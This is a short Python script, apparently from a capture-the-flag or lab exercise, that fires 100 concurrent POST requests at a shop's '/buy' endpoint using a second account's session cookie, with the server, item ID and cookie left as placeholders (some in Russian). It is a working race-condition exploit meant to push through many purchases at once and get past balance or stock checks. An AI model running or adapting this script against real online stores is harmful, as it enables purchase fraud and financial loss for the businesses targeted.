

import requests as r
import threading as t

def main():
    cust_cookie = {"session": "ВАША_СЕССИЯ_2_АККАУНТА"}

    res = r.post('http://[IP]:16103/buy/ID_ТОВАРА', cookies=cust_cookie)
    print(res.text, res.content)

if __name__=="__main__":
  threads = []
  x = 0
  while x < 100:
    x+=1
    thread = t.Thread(target=main)
    threads.append(thread)
    thread.start()
        #print(res.content)
  for thread in threads:
    thread.join()

